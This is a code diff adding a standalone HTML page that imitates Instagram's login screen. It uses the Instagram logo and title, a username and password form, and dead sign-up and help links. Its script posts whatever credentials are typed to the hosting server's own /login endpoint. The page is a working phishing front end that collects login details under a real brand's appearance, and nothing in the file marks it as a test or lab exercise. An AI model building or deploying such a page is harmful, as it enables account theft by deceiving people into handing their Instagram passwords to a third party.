@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="static/login.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="static/img.png" alt="Instagram Logo" aria-label="Instagram Logo">
+        </div>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required aria-label="Username or Email">
+            <input type="password" name="password" placeholder="Password" required aria-label="Password">
+            <button type="submit" aria-label="Log In">Log In</button>
+        </form>
+        <div class="links">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+            <p>Forgot password? <a href="#">Get help</a></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            // Collect form data
+            const formData = new FormData(this);
+
+            // Send a POST request to the server
+            const response = await fetch('/login', {
+                method: 'POST',
+                body: formData
+            });
+
+            // Handle the server response
+            const result = await response.text();
+            if (response.ok) {
+                alert(result); // Success message from server
+            } else {
+                alert('Incorrect credentials'); // Error message for incorrect login
+            }
+        });
+    </script>
+</body>
+</html>
